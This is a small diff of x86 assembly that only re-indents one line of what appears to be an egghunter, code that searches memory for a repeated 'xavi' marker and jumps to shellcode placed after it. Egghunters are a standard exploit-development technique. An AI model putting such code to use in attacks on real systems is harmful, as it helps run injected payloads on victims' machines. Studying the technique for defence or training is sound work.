@@ -26,7 +26,7 @@ next_address:
 	cmp dword [edx], 0x69766178
 	jnz next_address
 	cmp dword [edx + 0x4], 0x69766178
-  jnz next_address
+  	jnz next_address
 
 	; JMP to the shellcode
 	lea edx, [edx+8]
